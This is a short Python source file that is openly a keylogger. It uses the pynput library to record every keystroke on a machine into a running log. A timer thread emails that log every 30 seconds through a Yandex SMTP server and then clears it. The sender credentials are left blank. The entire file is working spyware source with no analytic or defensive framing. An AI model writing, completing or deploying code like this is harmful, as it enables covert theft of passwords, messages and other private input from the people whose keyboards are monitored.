import threading

import pynput.keyboard
import smtplib
log = ""
def callback_function(key):
    global log
    try:
        log =  log + key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log = log + " "
        else:
            log = log + str(f"/{key}/")
    except:
        pass

def send_email(email,password,text):
    email_server = smtplib.SMTP(host='smtp.yandex.com', port=587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,text)
    email_server.quit()

def thread_function():
    global log
    send_email("","",log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    thread_function()
    keylogger_listener.join()
